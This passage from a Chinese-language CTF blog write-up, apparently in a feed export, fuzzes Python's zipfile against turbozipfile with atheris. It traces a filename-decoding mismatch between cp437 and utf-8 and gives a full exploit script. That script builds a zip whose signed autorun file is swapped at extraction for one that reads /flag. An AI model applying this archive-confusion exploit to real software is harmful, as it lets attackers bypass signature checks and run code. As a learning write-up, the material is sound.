&#123;&#125; &#123;&#125;"</span>.format(pinfo.filename,finfo.filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pinfo.flag_bits != finfo.flag_bits:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"flag_bits disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.header_offset != finfo.header_offset:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"header_offset disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.internal_attr != finfo.internal_attr:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"internal_attr disagreement"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> pinfo.is_dir() != finfo.is_dir():</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"is_dir disagreement"</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> pinfo.reserved != finfo.reserved:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"reserved disagreement"</span>)</span><br><span class="line"><span class="keyword">if</span> pinfo.volume != finfo.volume:</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"volume disagreement"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> zf.open(pinfo) <span class="keyword">as</span> zf2:</span><br><span class="line">pdata=zf2.read()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> tf.open(finfo) <span class="keyword">as</span> tf2:</span><br><span class="line">fdata=tf2.read()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fdata != pdata):</span><br><span class="line"><span class="keyword">raise</span> RuntimeError(<span class="string">"data disagreement"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atheris.Setup(sys.argv, TestOneInput)</span><br><span class="line">atheris.Fuzz()</span><br></pre></td></tr></table></figure><p>很快就能够跑出crash，如下可以看出两个库在分析zip包中的文件时，获取的文件名可能会不同。</p><p><img src="https://i.loli.net/2021/08/15/Mk43oUKmhrlYgCb.png" alt="image-20210815221204001"></p><p>相比于没有源码的turbozipfile，我们去看看zipfile要更加可行。直接看获取文件名信息的函数，是ZipFile类中的_RealGetContent方法，可以看到有2种解码方式，再配合我们fuzz时显示的2个库提取的文件名都带有不同的特殊符号，那么就能知道问题很可能出在编码上。</p><p><img src="https://i.loli.net/2021/08/15/8DVN2W7fcZdperE.png" alt="image-20210815222107796"></p><p>为了验证这一点，我们将fuzz时显示的2个文件名分别进行cp437和utf-8的编码，可以看到得到了同样的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="string">"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob╧¿iWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">n2=<span class="string">"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4obϨiWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">print(n1.encode(<span class="string">'cp437'</span>))</span><br><span class="line">print(n2.encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/15/YTzPEUvkKV89jA3.png" alt="image-20210815222737138"></p><p>这说明turbozipfile和zipfile在提取文件名时的解码方式不同，turbozipfile使用utf-8，zipfile在flag &amp; 0x800为0时使用cp437。这意味着我们可以构造一个文件名p，它的末尾是base64编码的签名和autorun.py，并且使其在被cp437编码后还能被utf-8正常解码，调用zipfile将这个文件的名字写入到exp.zip中，这个文件的内容与sample的相同；第二个文件的名字则是由p经过utf-8编码再utf-8解码得到的，也使用zipfile写入到exp.zip中，它的内容是读取flag并打印。两个文件名都要utf-8解码的原因是zipfile在写入文件名时会进行一次utf-8编码。最后还要记得将生成的exp.zip中File header和Central directory file header中表示文件名编码的flag最高位改为0，这样zipfile才会使用cp437来解码。</p><p>exp的原理是文件一的名字被cp437解码后会得到p，由于它的内容与sample相同所以能够通过签名校验。此时find_valid_autorun返回，由turbozipfile解压缩，它使用utf-8解码文件一名字得到的不是p，而解码文件二名字时会得到p，因此它会运行文件二，读取并打印出flag。</p></li><li><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> turbozipfile</span><br><span class="line"></span><br><span class="line">p=<span class="string">'πü½πü╗πéô.'</span></span><br><span class="line">p=p+<span class="string">"YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">print(p)</span><br><span class="line">z=zipfile.ZipFile(<span class="string">'../exp.zip'</span>,<span class="string">'w'</span>)</span><br><span class="line">f=z.open(p.encode(<span class="string">'cp437'</span>).decode(<span class="string">'utf-8'</span>),<span class="string">'w'</span>)</span><br><span class="line">print(p.encode(<span class="string">'cp437'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">content=<span class="string">"""import os</span></span><br><span class="line"><span class="string">print("Directory contents:")</span></span><br><span class="line"><span class="string">for path in os.listdir('.'):</span></span><br><span class="line"><span class="string">  if path == '.' or path == '..':</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">  if path.endswith(".autorun.py"):</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">  print(path)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=z.open(p.encode(<span class="string">'utf-8'</span>).decode(<span class="string">'utf-8'</span>),<span class="string">'w'</span>)</span><br><span class="line">content=<span class="string">"""file=open("/flag")</span></span><br><span class="line"><span class="string">print(file.read())</span></span><br><span class="line"><span class="string">file.close()</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br><span class="line">z.close()</span><br><span class="line"></span><br><span class="line">zf=open(<span class="string">"../exp.zip"</span>,<span class="string">'rb'</span>)</span><br><span class="line">content=zf.read().replace(<span class="string">b'\x14\x00\x00\x08'</span>,<span class="string">b'\x14\x00\x00\x00'</span>)</span><br><span class="line">zf.close()</span><br><span class="line">zf=open(<span class="string">"../exp.zip"</span>,<span class="string">'wb'</span>)</span><br><span class="line">zf.write(content)</span><br><span class="line">zf.close()</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>高质量Pwn题难点基本都在于发现漏洞，但我都是看过漏洞点后才复现出的，到头来练习的还只是漏洞利用啊。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0-废话&quot;&gt;&lt;a href=&quot;#0-废话&quot; class=&quot;headerlink&quot; title=&quot;0.废话&quot;&gt;&lt;/a&gt;0.废话&lt;/h4&gt;&lt;p&gt;拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://veltavid.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
